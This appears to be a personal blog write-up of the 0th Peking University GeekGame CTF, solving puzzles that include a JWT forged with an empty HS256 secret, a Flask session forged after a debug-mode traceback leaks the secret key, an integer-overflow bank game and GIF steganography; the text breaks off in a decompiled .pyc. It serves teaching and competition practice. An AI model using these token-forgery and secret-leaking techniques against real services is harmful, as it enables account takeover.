---
date: 2021-05-23 12:00
head_image: https://file.moetu.org/images/2021/05/26/133429ad9a7520262f1dfcdb5d214e6aa188740b269115ec.jpg
head_image_height: 720
head_image_width: 722
info: 非官方题解。
last_modified_at: 2021-05-29 16:05
links: 
- - https://github.com/Xzonn/0th-PKU-Geek-Game-Writeups
  - 个人题解代码汇总
- - https://geekgame.pku.edu.cn/
  - 北京大学信息安全综合能力竞赛 官方网站
- - https://geekgame.pku.edu.cn/static/writeups/
  - 官方比赛资料汇总
logs: 
- 2021-05-26：补充了一些从官方信息以及新想法，修正了一处错误。
- 2021-05-27：修复“计算概论B”题目中乱码可能导致feed.xml产生问题的错误。
references: 
- - https://conanyu.github.io/2018/09/13/factorization/
  - Python大数因数分解
- - https://xz.aliyun.com/t/6776
  - 攻击JWT的一些方法
- - https://blog.csdn.net/qq_44657899/article/details/104594655
  - "[HCTF 2018]admin（flask session伪造，Unicode欺骗）"
- - https://www.jianshu.com/p/43928fd58afb
  - 哈夫曼(Huffman)编码python代码实现
- - https://blog.csdn.net/a200710716/article/details/51644421
  - ZIP文件格式分析
tags: 题解
title: 第零届北京大学信息安全综合能力竞赛个人题解
---
<style>
.you-name {
    background: linear-gradient(0deg, #26791c, #1d1d1d, #1d1d1d);
    text-shadow: 0 0 1px rgba(21, 66, 14, 0.4);

    -webkit-text-fill-color: transparent;

    background-clip: text;
    -webkit-background-clip: text;

    box-decoration-break: clone;
    -webkit-box-decoration-break: clone;
}
</style>
``` javascript
/*!
 * 第零届北京大学信息安全综合能力竞赛个人题解
 * Author: Xzonn
 * Date: 2021-05-23
 */
```

## 前言
某天下午我在实验室登录[its](https://its.pku.edu.cn/)的时候突然发现了[这个比赛的通知](https://its.pku.edu.cn/announce/tz20210514134448.jsp)，虽然我不是计算机专业，之前并没有参加过类似的比赛，而且恰逢毕业季交毕业论文的[DDL](https://en.wikipedia.org/wiki/Deadline)，但我还是忍不住报名参加了。

以下是部分题目的个人题解，因为水平有限，时间不充足，仅解出了部分题目。所有与个人信息相关的内容都已模糊化处理，我本人的Token也已删除。所有代码可以从[GitHub](https://github.com/Xzonn/0th-PKU-Geek-Game-Writeups)找到。

根据官方给出的说明，[题目说明](https://geekgame.pku.edu.cn/static/writeups/desc/description.html)内容按照“[知识共享署名-非商业性使用 4.0 国际许可协议（CC BY-NC 4.0）](https://creativecommons.org/licenses/by-nc/4.0/)”进行许可。本题解按照“[知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议](https://creativecommons.org/licenses/by-nc-sa/4.0/)”进行许可，兼容前者所用的协议。题目说明原始版权归属PKUGGG Team所有。

## →签到←
### 题目说明
请进入选手 QQ 群 939856833。随着比赛进行，我们可能会发布通知、对题目的补充说明或提示，届时将在本平台和 QQ 群发布，敬请留意。

**请在群公告中找到签到题，根据群公告中编码的数据解出 Flag**

> *如果你此前没有打过 CTF 比赛，下面是一些说明：*
> 
> 虽然每道题的目标不同，但都对应一个形如 flag{...} 的字符串。按照要求解出题目之后，可以获得 Flag。将这个字符串输入到下面的文本框即可得分。
> 
> 另外，某些题会要求输入 Token 来确认你的身份。点页面底部的 “复制个人 Token” 按钮来获得自己的 Token。

----

补充说明：群公告中的签到题如下：

> c3ludHtKM3lwYnpyIGdiIDBndSBDWEggVGhUaFRoLCByYXdibCBndXIgdG56ciF9

### 解法
看到一长串字符串，同时包括大小写字符，首先想到是[Base64](https://zh.wikipedia.org/wiki/Base64)。F12打开控制台，运行：

``` javascript
atob("c3ludHtKM3lwYnpyIGdiIDBndSBDWEggVGhUaFRoLCByYXdibCBndXIgdG56ciF9")
// "synt{J3ypbzr gb 0gu CXH ThThTh, rawbl gur tnzr!}"
```

字符串中有“{}”，已经很接近结果了。但是“{”前面是“synt”不明所以，按照题目说明应该为“flag”，想到[凯撒密码](https://zh.wikipedia.org/wiki/%E5%87%B1%E6%92%92%E5%AF%86%E7%A2%BC)，也即字符串的字幕按照字母表偏移。先验证一下假设：

``` javascript
"synt".charCodeAt(0) - "synt".charCodeAt(1)
// -6

"flag".charCodeAt(0) - "flag".charCodeAt(1)
// -6
```

前两个字母的[ASCII码](https://zh.wikipedia.org/wiki/ASCII)差值一致，很有可能假设是正确的。直接上python：

``` python
a = "synt{J3ypbzr gb 0gu CXH ThThTh, rawbl gur tnzr!}"
b = ""
for i in a:
    if "a" <= i <= "z":
        i = chr((ord(i) - ord("a") + ord("f") - ord("s") + 26) % 26 + ord("a"))
        b += i
    elif "A" <= i <= "Z":
        i = chr((ord(i) - ord("A") + ord("f") - ord("s") + 26) % 26 + ord("A"))
        b += i
    else:
        b += i
print(b)
```

得到flag：`flag{W3lcome to 0th PKU GuGuGu, enjoy the game!}`。

组委会提供了一个[“假网站”](https://www.qqxiuzi.cn/bianma/kaisamima.php)，使用这个网站解密出来的结果会有一个“&ensp;”（`&ensp;`，`U+2002`）。

{% include figure.html src="https://file.moetu.org/images/2021/05/26/2b146e8c2f4fc5d42af78e83c88add14e8ebff54aadea971.png" width="797" height="340" %}

查看了一下源代码这个东西解密凯撒密码竟然还要往服务器发请求，不知道服务器端写了什么奇怪的程序。这也是为什么组委会特意发了公告：

> 所有题目的 Flag 都以 “flag{” 开始、“}” 结束，Flag 是大小写敏感和空白符敏感的（即大小写和空格等与答案不一致都会导致flag错误），所有 Flag 都是可打印的纯 ASCII 字符

## 主的替代品
### 题目说明
替代赎罪是一个令人生畏的短语，所以让我们对其进行分解。最简单的形式是，如果有人用自己代替我们赎罪，那么他们就是在代替我们偿还我们所欠的款项。我们欠上帝的钱确实很多。他是完美的本质，因此不能在他的存在下出现瑕疵。不幸的是，我们是核心的不完美罪人。因此，我们不需要在外部简单地“变得更好”，而在内部需要完美无瑕的完美。这是我们无法提供的，因此我们必须依靠其他东西：替代品。

请向评测机提交一个 C 程序，输出任意包含 main 的字符串。但评测机会把代码中所有的 main 字符串替换成 mian 再编译运行。

评测机上的编译命令形如：
gcc test.c -o test

**点击 “打开/下载题目” 将打开网页终端，你也可以通过命令 nc prob04.geekgame.pku.edu.cn 10004 手动连接到题目**

> *如果你此前没有打过 CTF 比赛，下面是一些说明：*
>
> nc 是 Linux 系统的一个命令行工具，可用于连接到服务器的指定端口。除此之外，也可以使用任意编程语言带 socket 通信功能的库（如 Python 的 pwntools）连接到题目。对于不需要自动化交互的题目，使用网页终端可能比较方便。

[打开/下载题目](http://prob04.geekgame.pku.edu.cn/)

### 解法
源代码中有两处需要出现“main”：第一处是`main()`函数，第二处是`main`字符串。字符串其实很好解决，可以用字符数组代替字符串；函数名我一开始没有想到合适的办法，想了半天才想到计算概论里面似乎讲过如何在一行语句中换行——在前一行末尾输入“\”，然后输入换行符，在下一行继续写代码。最后得到源代码如下：

``` c
#include "stdio.h"
void ma\
in(){char a[5]={109,97,105,110,0};printf("%s",a);}
```

本地编译的时候会有Warning<del>，但是程序员从来不看Warning</del>。

本题flag：`flag{to_main_or_not_to_main_that_is_a_question_00000000}`。

看了别人的题解我才知道原来宏是可以连接两个字符的，形如“m ## a ## i ## n”。好吧，这我真没学过。

## 小北问答 1202
### 题目说明
<span class="you-name">You</span> 酱善于使用十种搜索引擎，别人不知道的事情她能一秒钟搜索出来。别人都不相信她，因为别人每次在百度搜索自己的代码为什么报错，都只能搜到一些意义不明的 CSDN 博客。

这两天，又有人拿着计概 B 的代码来问 <span class="you-name">You</span> 酱。<span class="you-name">You</span> 酱看到满屏幕的全角括号之后彻底忍受不了了，她灵机一动，决定把回答问题的工作外包出去。

“这些是别人问我的问题列表，帮我答出至少五道就可以获得一个 Flag，全都答出来就可以获得第二个 Flag。” <span class="you-name">You</span> 酱如是说。

**补充说明：**此题考查的是收集和运用信息的能力，解题所需的所有信息都可以在网上公开找到，不需要选手具有特定生活经验。

**点击 “打开/下载题目” 进入题目网页**

[打开/下载题目](http://prob08.geekgame.pku.edu.cn/)

### 解法
签到题和题目里面带“<span class="you-name">You</span> 酱”的都是 [@xmcp](https://github.com/xmcp) 出的。直到比赛结束后我才发现“<span class="you-name">You</span> 酱”的名字有特殊的格式。据xmcp本人所说，“<span class="you-name">You</span> 酱”是这位：

{% include figure.html src="https://file.moetu.org/images/2021/05/26/133429ad9a7520262f1dfcdb5d214e6aa188740b269115ec.jpg" alt="<span class=\"you-name\">You</span> 酱" width="361" height="360" %}

#### #1
> 理科一号楼共有 8 个计算中心机房，其中第 n 机房的门牌号是X<sub>n</sub>（1000≤X<sub>n</sub>≤9999），求 ∑ (X<sub>n</sub>)<sup>n</sup> 的最大质因数
>
> 答案格式：`^\d+$`

计算中心8个机房的门牌号见[计算中心官网](https://its.pku.edu.cn/pcroom.jsp)，从1到8依次为：1258、1263、1261、1204、1203、1249、1339、1338。先根据公式计算，结果为`10279576720584031841969783`。大数求最大质因数比较麻烦，这里参考了ConanYu的[这篇文章](https://conanyu.github.io/2018/09/13/factorization/)，虽然没看懂但是运行速度很快，最后得到最大质因数为`108475792463321`。

根据官方题解也可以用`sympy.factorint`函数。

#### #2
> 北京大学的哪门课被称为“讲得好、作业少、考试水、给分高的课”（中文全称）？
> 
> 答案格式：`^.+老师的.+$`

看到这题我第一反应是“[赵克常老师的地震概论](/posts/Introduction-to-Seismology-Notes.html)”，但是我第一次提交未通过；改为“赵老师的地震概论”也不对。这时官方公告提示了“不需要选手具有特定生活经验”，考虑到参赛者有校外邀请人员，题目答案应该是公开可查的。我分别在[树洞](https://pkuhelper.pku.edu.cn/hole)和[BBS](https://bbs.pku.edu.cn/)搜索，都没有找到结果，最终是谷歌搜索“给分高”才发现了[课程测评网站](https://courses.pinzhixiaoyuan.com/)标题下面就是“来自同学们的课程测评, 帮你找到<abbr title="穆良柱老师的热学">讲得好、作业少、考试水、给分高</abbr>的课”。

这得赖谷歌，我直接查“[讲得好、作业少、考试水、给分高](https://www.google.com/search?q=%E8%AE%B2%E5%BE%97%E5%A5%BD%E3%80%81%E4%BD%9C%E4%B8%9A%E5%B0%91%E3%80%81%E8%80%83%E8%AF%95%E6%B0%B4%E3%80%81%E7%BB%99%E5%88%86%E9%AB%98)”没出现相关结果，后来试了下“["讲得好、作业少、考试水、给分高"](https://www.google.com/search?q=%22%E8%AE%B2%E5%BE%97%E5%A5%BD%E3%80%81%E4%BD%9C%E4%B8%9A%E5%B0%91%E3%80%81%E8%80%83%E8%AF%95%E6%B0%B4%E3%80%81%E7%BB%99%E5%88%86%E9%AB%98%22)”才有唯一结果。

不过这里有个问题，如果我在比赛期间建了一个网站，然后提交给谷歌、必应、百度等各大搜索引擎，然后花钱买流量，会不会出现干扰？当然我并没有这么做，奖金应该也不够我买流量的。

另外组委会统计了本题第一次提交的答案，有72个人提交了“赵克常老师的地震概论”，看来大家的想法都是类似的。<del>另外还有一个人提交了“赵克常老师的地震概概论”，另一个人提交了“赵克常老师的地震概率”</del>

#### #3
> 根据 HTCPCP-TEA 协议，当一个茶壶暂时无法煮咖啡时，应当返回什么状态码？
>
> 答案格式：`^\d{3}$`

参考[协议原文](https://tools.ietf.org/html/rfc7168#section-2.3.3)：

```
TEA-capable pots that are not provisioned to brew coffee may return
either a status code of 503, indicating temporary unavailability of
coffee...
```

答案为`503`。

一开始我回答的是`418`，但418状态码返回的是“我是茶壶”，表明自己永远不会煮咖啡。题目问的是“暂时无法煮咖啡”，因此是503。

#### #4
> 在 <span lang="en">Conway's Game of Life</span> 中，有多少种稳定的由 7 个活细胞构成的局面？稳定是指每个时刻的状态都与初始状态完全相同。旋转或对称后相同的视为同一种局面。
> 
> 答案格式：`\d+$`

参考[Life Wiki的“Still life”页面](https://www.conwaylife.com/wiki/Still_life#Enumerating_still_lifes)，答案为`4`。

#### #5
> FAStT Management Suite Java 是 IBM 推出的一款软件，它的默认密码是？
> 
> 答案格式：`^\w+$`

[谷歌搜索“FAStT Management Suite Java default password”](https://www.google.com/search?q=FAStT+Management+Suite+Java+default+password)得到答案为`config`。（网页原始地址为<ftp://ftp.software.ibm.com/systems/support/system_x_cluster/ibm_sw_sansurfer_2.0.30b81_windows_i386.txt>，但Chrome似乎已经不支持ftp协议，因此无法直接打开。）

#### #6
> 最小的汉信码图案由多少像素（被称为“模块”）构成？
> 
> 答案格式：`\d+$`

根据[这篇文章](https://blog.csdn.net/marshou/article/details/79623752)，汉信码最小分辨率为23 × 23，即`529`。也可以参考“GB/T 21049-2007 汉信码”。

#### #7
> 哪个国密算法基于椭圆曲线密码？
> 
> 答案格式：`SM\d+$`

根据[这篇文章](https://www.jianshu.com/p/5b04b66a55a1)，答案为`SM2`。

#### #8
> 在 2013 年 5 月 4 日，全世界共有多少可用的顶级域名（TLD）？
> 
> 答案格式：`\d+$`

根据[ICANN的报道在2013年5月11日的存档](https://web.archive.org/web/20130511074607/http://stats.research.icann.org/dns/tld_report/)，并对比[4月23日的存档](https://web.archive.org/web/20130423141925/http://stats.research.icann.org/dns/tld_report/)，答案为`317`。

后来我才发现这个报告有每日存档，比如[5月4日的存档](http://stats.research.icann.org/dns/tld_report/archive/20130504.000101.html)。

另外这个“可用”有两种理解，组委会最初参考的是[Root Zone Database](https://www.iana.org/domains/root/db)，答案为`329`，因为部分域名属于“not assigned”状态，去掉之后就是317了。

本题flag：

- `flag{you-are-master-of-searching_00000000}`
- `flag{you-are-phd-of-searching_00000000}`

## 与佛论禅网大会员
### 题目说明
<span class="you-name">You</span> 酱有着二十年网龄，从论坛黑话到图种的制作方法都十分熟悉。某天，<span class="you-name">You</span> 酱在树洞发了一个 RSA 公钥，试图实践加密聊天，然而洞里没有一个人理她。

她很伤心。她不明白这届年轻人怎么连这种简单的 Trick 都不会了。

这回 <span class="you-name">You</span> 酱把两个 Flag 藏在了一张 GIF 图里，希望你能找出来。

**点击 “打开/下载题目” 下载题目附件**

[打开/下载题目](https://geekgame.pku.edu.cn/media/ffea256a-a6e9-43f8-87bf-7d9f2bed0e54.zip)

### 解法
解压压缩包可以得到一个gif图：

{% include figure.html src="https://file.moetu.org/images/2021/05/23/17a854c2cfd800a7e7bf9e244736fb0d5b27e024a7bda5a8.gif" alt="quiz.gif" width="258.5" height="248.5" %}

根据提示这是个[图种](https://zh.moegirl.org.cn/%E5%9B%BE%E7%A7%8D)，将其后缀名改为“.zip”解压得到第一个flag：`flag{K33p_going!Passw0rd-is-hidden-in-the-1mage}`。

第二个flag有密码，根据第一个flag的提示，密码隐藏在图片里。首先猜想有文字隐藏在背景中，拿[PS](https://www.adobe.com/products/photoshop.html)打开图片，用魔术橡皮擦选择容差为0，擦掉所有的背景，得到这么一张图：

{% include figure.html src="https://file.moetu.org/images/2021/05/23/47c117b90bd2753c46003851bdeee082c91760d8f59492ad.png" width="536" height="229" %}

看上去没什么不正常……我研究了好久才发现，右边的图层不止一个。依次切换图层的显示状态，发现偶数图层的四个角落分别有一些马赛克，将它们单独裁剪出来拼在一起，并做反色处理，得到新的一张图：

{% include figure.html src="https://file.moetu.org/images/2021/05/23/05ddbe8b062ba76f79253281062f7073df3429c2d7ebb77c.png" width="261" height="261" %}

一堆像素方块，缺了四个角，马上想到[QR码](https://zh.wikipedia.org/wiki/QR%E7%A2%BC)，但直接扫码扫不出来，需要补充码眼，具体可以参考维基百科上的说明。补充完毕之后得到：

{% include figure.html src="https://file.moetu.org/images/2021/05/23/a3d150f6e138cbe579c7356a18a6ae22ef9a506196f1b455.png" width="261" height="261" %}

拿微信扫描一下，得到一个网址：`https://www.pku.edu.cn/#hint=zip_password_is_fm2jbn2z6t0gl5le`，那么密码就是`fm2jbn2z6t0gl5le`，解压得到第二个flag：`flag{you are master of stegan0. Here is y0ur flag}`。

另外题目里面的RSA公钥我没在树洞里找到，不知道是不是真的存在。

看了官方题解我才发现有个网站叫[“与佛论禅”](https://www.keyfc.net/bbs/tools/tudoucode.aspx)……还好我没往那边想。

## 2038 年的银行
### 题目说明
兆京市是知名的金融中心，许多银行都在此设立总部。然而在 2038 年的某一天，这里有 3 家历史悠久的银行突然凭空消失了。

为挽回储户们的损失，时间管理局费尽心思恢复了这几家银行的程序与数据。这些银行能让钱消失，那是不是也能让钱变多呢？你带着 500 元来到了这几家银行前，试图买到一个 Flag。

**点击 “打开/下载题目” 进入题目网页**

[打开/下载题目](http://prob09.geekgame.pku.edu.cn/)

### 解法
我第一反应是F12直接拿到Flag，但似乎不行，这题的数据存放在远程而不是本地。多次试验之后可以发现，借款额度会根据最大存款增加而增加，最大为2000000000；因此可以先在A银行存500元然后取出，再借款5000元；再在B银行存5500元取出，再借款55000元……

但要小心，此题存在数据溢出，当钱数大于2<sup>31</sup> - 1时会溢出（这也是[Int32](https://docs.microsoft.com/en-us/dotnet/api/system.int32)的最大值）。利用这一漏洞，先将某银行借款最大额度扩大到2000000000，然后全部借款；再将一部分钱存入银行，买面包睡觉。欠款会因为溢出而在正数和负数之间来回横跳，当欠款金额为正数且存款金额大于欠款金额就可以将存款全部取出还债，然后将剩余存款放到银行吃利息就好了。

本题flag：`flag{SucH_Na!V3_b4Nk_00000000}`

题目里的“2038”应该指的是[2038年问题](https://zh.wikipedia.org/wiki/2038%E5%B9%B4%E9%97%AE%E9%A2%98)，恰好涉及32位整数。

## 人类行为研究实验
### 题目说明
小 Y 所在的兆京大学某实验室主要研究方向是动物行为模式。

他们为了研究动物的智能行为，设计了一个游戏，并用这个游戏测试了多种动物的智能行为。

他们让猴子游玩这个游戏：猴子获得的分数越多，就能获得更多的香蕉。

但他们需要做对比实验才能获得更详细的数据。因此他们找到了你。作为你配合实验的报酬，他们会给你 Flag。

为了获取你的详细信息以进行更好的数据分析，你需要进行登记并主动上传成绩。

据小 Y 本人说，他们实验室的网络安全工作十分差劲。虽然整个实验室内网有防火墙，但是某位同学为了在宿舍就能工作，偷偷开了一个代理，使用这个代理便可接入他们内网。而这个成绩登记系统本应直接申请接入学校的 IAAA 登录，但权限还没批下来。为了让实验能尽快进行，他从网上随便抄了一份代码作为身份认证的后端。由于时间匆忙，他没有研究并设置任何的可配置参数。

现在你在宿舍，并不想下楼的你希望不出宿舍也能拿到 Flag。

实验室内网代理： http://prob01.geekgame.pku.edu.cn:10001/

**注意：**该代理只能访问实验室内网。其他网站（包括本平台）无法通过该代理访问。

**点击 “打开/下载题目” 进入游戏网页，该网页只有内网可以访问**

[打开/下载题目](http://game.pku.edu.cn/)

### 解法
首先配置[代理服务器](https://zh.wikipedia.org/wiki/%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8)，Chrome浏览器可以尝试[SwitchyOmega](https://github.com/FelisCatus/SwitchyOmega)扩展。配置一个名为“内网”的情景模式，然后配置一个“HTTP自动切换”，将域名通配符“game.pku.edu.cn”和“iaaa.pku.edu.cn”设置为“内网”。之后就可以访问内网了。

第一个flag比较好拿到，直接查看源代码，发现JavaScript存放在`maximum.js`，其中涉及到“flag”的内容为：

``` javascript
function get(won) {
    if (won) {
        var target = "/" + [![] + []][+[]][+[]] + [![] + []][+[]][!+[] + !+[]] + [+[![]] + []][+[]][+!+[]] + "g?k=" + ("c" + [96, 55, 109, 99].sort().map(_=>String.fromCodePoint(_ + 12)).join("") + [[][[]] + []][+[]][+!+[]] + "o" + +"n" + "e").toLowerCase();
        target = target + "&token=" + encodeURIComponent(TOKEN);
        let request = new XMLHttpRequest;
        request.onreadystatechange = function() {
            if (request.readyState == 4 && request.status == 200) {
                var time = new Date(request.getResponseHeader("Date"));
                var ftime = [time.getFullYear(), ("0" + (1 + time.getMonth())).slice(-2), ("0" + time.getDate()).slice(-2)].join("-") + " " + [("0" + time.getHours()).slice(-2), ("0" + time.getMinutes()).slice(-2), ("0" + time.getSeconds()).slice(-2)].join(":");
                showMsg();
                MSGT.innerHTML = "祝贺！";
                MSGP[0].innerHTML = "你在" + ftime + "获得了" + s + "的成绩，成功过关！";
                MSGP[1].innerHTML = "这是你的flag: " + request.responseText;
                MSGB[0].style.display = "inline-block";
                MSGB[1].style.display = "inline-block"
            }
        }
        ;
        request.open("GET", target);
        request.send()
    } else {
        showMsg();
        MSGT.innerHTML = "很遗憾";
        MSGP[0].innerHTML = "在此次尝试中，您未能及格。";
        MSGP[1].innerHTML = "再试一次吧！↓↓↓";
        MSGB[0].style.display = "inline-block";
        MSGB[1].style.display = "none";
        showMsg()
    }
}
```

其中`target`的赋值在控制台中运行得到`/flag?k=cyclononane`，然后在后面附上token，就可以拿到第一个flag：`flag{Al1ow_prEviEw1n9_Fl4G_00000000}`。

第二个flag比较麻烦，点击提交成绩，会跳转到一个URL类似`http://iaaa.pku.edu.cn/?token=xxx&score=100`的页面。注意网址开头为http协议，而不是https协议，而正常的iaaa只能通过https协议访问。我一开始配置代理服务器的时候没有把“iaaa.pku.edu.cn”加入内网，因此总是访问错误；后来才想起来这里可能是个坑。

进入iaaa之后发现是个假网站：

{% include figure.html src="https://file.moetu.org/images/2021/05/23/6a4dfb42b2bee1d7c957b733820be35b6bb2d80c14268d10.png" alt="真正的百京大学" width="720" height="644" %}

这是真正的iaaa：

{% include figure.html src="https://file.moetu.org/images/2021/05/23/9dc4740acf8f3384bca031f26dc6077057a05a5444c8fa32.png" alt="虚假的百京大学" width="720" height="644" %}

对比了一下源代码，发现基本没有什么变化，只是点击“登录”并不会发送除了token以外的任何信息（也就是不会泄露用户名和密码）。点击登录之后获取了一个叫做`jwt`的参数，然后跳转到了URL类似`http://game.pku.edu.cn/callback?_rand=xxx&jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZGVudGl0eSI6InN0dWRlbnQifQ.yY787WIxisr88ADjV-3q2MdvdFoYJvIlA9IChYFvn_Y&token=xxx`{: .line-break }的页面，页面内容是：

```
感谢你完成实验。由于你的身份是student，我们无法赠送你一个flag。只有teacher可以领取flag。
```

解析了一下`jwt`这个参数（参考[这篇文章](https://xz.aliyun.com/t/6776)），和下面的“[人生苦短](#人生苦短)”类似，是用“`.`”分隔的三段参数，都是base64编码，第一个为header，第二个为payload，第三个为signature。分别解析header和payload，得到：

``` json
{
    "typ": "JWT",
    "alg": "HS256"
}
```

``` json
{
    "identity": "student"
}
```

此处的“身份是student”指的应该就是payload中“identity”参数为“student”，尝试将其改为“teacher”，然后重新构造jwt。

Python中存在对应的库[“pyjwt”](https://github.com/jpadilla/pyjwt)，用法比较简单。按照文章中给出的方法，先尝试加密方法为空（即header的“typ”参数为“none”）：

``` python
import jwt
print(jwt.encode({"identity":"teacher"}, "", algorithm="none"))
# eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJpZGVudGl0eSI6InRlYWNoZXIifQ.
```

访问`http://game.pku.edu.cn/callback?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJpZGVudGl0eSI6InRlYWNoZXIifQ.&token=`{: .line-break }，结果为“Error”。修改kid/jku/x5u参数需要其他条件，本题也不满足。我选择了暴力猜测秘钥，使用[c-jwt-cracker](https://github.com/brendan-rius/c-jwt-cracker)项目放在云服务器上跑，但是很长时间都没有出结果。

最后，偶然的情况下，我尝试了秘钥为空字符串的情况：

``` python
import jwt
print(jwt.encode({"identity":"teacher"}, "", algorithm="HS256"))
# eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZGVudGl0eSI6InRlYWNoZXIifQ.22-u3h1xug6OPI-1gNRT2rFKeZuD8ju29DhCwMEyxaw
```

访问`http://game.pku.edu.cn/callback?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZGVudGl0eSI6InRlYWNoZXIifQ.22-u3h1xug6OPI-1gNRT2rFKeZuD8ju29DhCwMEyxaw&token=`{: .line-break }，然后成功了……

```
感谢你完成实验。这是我们额外赠送给你的flag： flag{D4nG3r0u5_pRoXy_4Nd_s1MpLe_jvvT_00000000}
```

好吧，我总算理解了“没有研究并设置任何的可配置参数”是什么意思了。但是这个cracker程序，为什么没有考虑秘钥为空的情况呢？<del>不会真有人在生产环境用空秘钥吧</del>

但是，明明题目里面是“兆京大学”，怎么网站变成了“百京大学”？而且“百京大学”认证页面的图片还是“北京大学”。

组委会提到了认证页面不会泄露用户名和密码<del>，但怎么还有手动把用户名和密码发送给服务器的</del>

## 人生苦短
### 题目说明
<span class="you-name">You</span> 酱最喜欢用的 Python 库是 Flask。她回忆自己给兆京大学千年讲堂做后端开发的那段时光，感叹道：那个购票系统只写了一百多行就写完了，不愧是 Python。

现在，有一门课的老师找到她，让她写一个程序来演示什么是 “自举”。具体来说，这个系统在登录之后就可以获得 Flag，但是 Flag 恰好就是登录密码。

对这个奇怪的需求，<span class="you-name">You</span> 酱感觉莫名其妙，但她还是很快就把系统写出来了。

然而，由于在系统上线前的一处小疏忽，使得看似不可能被拿到的 Flag 实际是可以被拿到的。你能找到程序中的问题吗？

**点击 “打开/下载题目” 进入题目网页**

[打开/下载题目](http://prob10.geekgame.pku.edu.cn/)

---

补充说明：网页中提供的源代码如下：

``` python
from flask import *
from flag import getflag

app = Flask(__name__)
app.secret_key = ***

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.is_json:
        action = request.json.get('action', '').strip()
        flag = getflag(request.json.get('token', '').strip())

        if action=='login':
            if request.json.get('flag', '').strip()==flag:
                session['admin'] = True
                return '已登录'
            else:
                return 'flag错误'

        elif action=='logout':
            session['admin'] = False
            return '已注销'

        elif action=='getflag':
            if 'admin' in session and session['admin']:
                return 'Here is your flag: '+flag
            else:
                return '请登录后查看flag'

        else:
            return '操作无效'

    else:
        return render_template('index.html')

@app.route('/src')
def src():
    with open(__file__, encoding='utf-8') as f:
        src = f.read()
        src = src.replace(repr(app.secret_key), '***')

    resp = Response(src)
    resp.headers['content-type'] = 'text/plain; charset=utf-8'
    return resp

app.run('0.0.0.0', 5000, True)
```

### 解法
看源代码可以发现，当`session['admin']`为真值时会返回flag，想到伪造session。参考了[这篇文章](https://blog.csdn.net/qq_44657899/article/details/104594655)，Flask的session是以cookies的形式保存在浏览器的，形如`session=eyJhZG1pbiI6ZmFsc2V9.YKekQA.SISpDkpLtwZROS71dv6dbxVw3Ro`。点号`.`将其分割为三段，第一段为Base64编码的数据，后两段为签名。如果要伪造session需要知道源代码中的`app.secret_key`。

文章中给出的示例已经给出了秘钥，但本题源代码没有给出，因此需要通过一些手段来“骗”。

在题目页面选择操作为“login”，会弹出输入框要求输入flag。如果我们点击“取消”或按Esc，会发现页面中出现了错误代码。F12分析Network，发现请求中的数据包含了以下内容：

``` json
{
    "token": "***",
    "action": "login",
    "flag": null
}
```

由于flag为`null`（对应Python中的`None`），因此在运行`request.json.get('flag', '').strip()`时出错（`None`无法`strip()`）。而报错信息中会显示出错源代码的上下文，利用这一点我们可以伪造一个请求，仅包含`{"action":null}`。

在控制台运行：

``` javascript
fetch('?', {
    method: "post",
    headers: {
        "content-type": "application/json",
    },
    body: JSON.stringify({
        "action": null
    })
})
```

返回数据中包含了上下文：

``` python
app.secret_key = 'oh you got it, one more step to get flag'

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.is_json:
        action = request.json.get('action', '').strip()
        flag = getflag(request.json.get('token', '').strip())

        if action=='login':
            if request.json.get('flag', '').strip()==flag:
                session['admin'] = True
```

这样就得到了秘钥`oh you got it, one more step to get flag`。利用[flask-session-cookie-manager](https://github.com/noraj/flask-session-cookie-manager)伪造session，然后将cookie存放在浏览器中，再选择操作为“getflag”，得到flag：`{F1a5k_debugging_mode_1S_1Ns3cure_00000000}`。

所以，Debug模式有风险，一定不能在生产环境使用。

## 弗拉梅尔的宝石商店
### 题目说明
尼可·勒梅生于 1330 年，精通拉丁文、希腊文。他在巴黎依靠卖书与抄写文章为生，也收学生，教他们抄写和画插图。经常有贵族花钱请他抄录珍稀稿本，所以他有可能抄到了炼制 Flag 的文稿。

他平凡无奇的人生在一个夜晚产生戏剧性的大转变，一位天使来到他的梦境中，告诉他将收到一本神奇书册，他必须努力研读并且透彻了解，就可获得非凡惊奇的力量。    
这部神秘的文献名为《犹太亚伯拉罕之书》（Book of Abraham the Jew）。尼可·勒梅在解读它之前，花费了 21 年时间来收集资料，最后在一位希伯莱学者的帮助下，尼可·勒梅于 1382 年 4 月 25 日记载了以下的话：“我总是逐字确实地随着书的指示，根据相同数量的水银来推演红石……然后就真的将水银转变成黄金了，确实比普通的金子好，更柔软也更具可塑性。”

请想办法从弗拉梅尔的宝石商店里购买 Flag。

**你可以 [下载本题的程序](https://geekgame.pku.edu.cn/media/46142981-101b-417b-850e-61163ca65a4c.zip)**

**点击 “打开/下载题目” 将打开网页终端，你也可以通过命令 nc prob03.geekgame.pku.edu.cn 10003 手动连接到题目**

[打开/下载题目](http://prob03.geekgame.pku.edu.cn/)

### 解法
这个题给出的程序名为“service.cpython-38.pyc”，可以推测这是个编译过的Python程序。尝试用[python-decompile3](https://github.com/rocky/python-decompile3)反编译，能够得到部分代码：

``` python
# decompyle3 version 3.3.2
# Python bytecode 3.8 (3413)
# Decompiled from: Python 3.8.5 (default, Jan 27 2021, 15:41:15) 
# [GCC 9.3.0]
# Embedded file name: service.py
# Compiled at: 2021-05-21 16:36:16
# Size of source mod 2**32: 7123 bytes
Instruction context:

 L. 151        62  POP_BLOCK        
->                64  LOAD_CONST               True
                  66  RETURN_VALUE     
                68_0  COME_FROM            52  '52'
Instruction context:

 L. 165        38  POP_BLOCK        
                  40  POP_EXCEPT       
->                42  CALL_FINALLY         48  'to 48'
                  44  LOAD_CONST               False
                  46  RETURN_VALUE     
                48_0  COME_FROM            42  '42'
                48_1  COME_FROM_FINALLY    28  '28'
                  48  LOAD_CONST               None
                  50  STORE_FAST               'e'
                  52  DELETE_FAST              'e'
                  54  END_FINALLY      
                  56  POP_EXCEPT       
                  58  JUMP_FORWARD         62  'to 62'
                60_0  COME_FROM            20  '20'
                  60  END_FINALLY      
                62_0  COME_FROM            58  '58'
